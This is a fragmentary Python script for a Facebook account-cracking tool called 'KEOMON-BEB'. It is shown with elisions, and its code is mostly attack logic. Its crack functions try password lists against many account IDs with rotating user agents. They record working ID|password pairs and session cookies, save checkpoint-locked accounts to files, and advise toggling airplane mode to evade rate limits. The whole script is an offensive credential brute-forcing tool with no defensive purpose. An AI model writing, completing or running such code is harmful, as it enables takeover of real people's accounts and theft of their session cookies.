...
def back():
	login()
def contact():
	os.system('xdg-open https://facebook.com/keomon.29')
	back()
def linex():
...
|      <_/ __ \/  _ \ /  \ /  \ /  _ \ /    \ 
|    |  \  ___(  <_> )    Y    (  <_> )   |  \
|____|__ \___  >____/\____|__  /\____/|___| 
        \/   \/              \/            \/ """)    

      
def info():         
    print("""\033[1;32m=====================\033[1;37m=====================
• DEVLOPER : \033[1;37mKEOMON-\033[1;32mBEB\033[1;37m
• Version  :\033[1;32m v4 \033[1;32m \033[1;37m
\033[1;32m=====================\033[1;37m=====================""")
...
def passwrd():
    ...
    linex()
    print("\033[1;37m USE AIRPLANE MODE FOR MORE IDS\033[1;32m")
    linex()
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r \u001b[37m[KEOMON-BEB] {loop}/{len(id)} OK[{H}{ok}\u001b[37m] [{'{:.0%}'.format(loop/float(len(id)))}]  "),
	sys.stdout.flush()
...
'bi_xrwh': 0
    ...
    'viewport-width': '980',
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				print(f'\r{P}{H} [KEOMON-OK] {H}{idf}|{pw}\n{P}[{H}COOKIE]{P}\033[1;31m{kuki}')
				...
				print(f'\r{P}[{K}KEOMON-CP{P}] {K}{idf}|{pw}')
...
def crackfree(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r \u001b[37m[KEOMON-M2] {loop}/{len(id)} OK[{H}{ok}\u001b[37m] [{'{:.0%}'.format(loop/float(len(id)))}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{P}{K} [{time.strftime("KEOMON")}-CP] {idf} │ {pw} {P}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
				...
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{P}{H} [{time.strftime("KEOMON")}-OK] {idf} │ {pw} {P}')
				cek_apk(kuki)
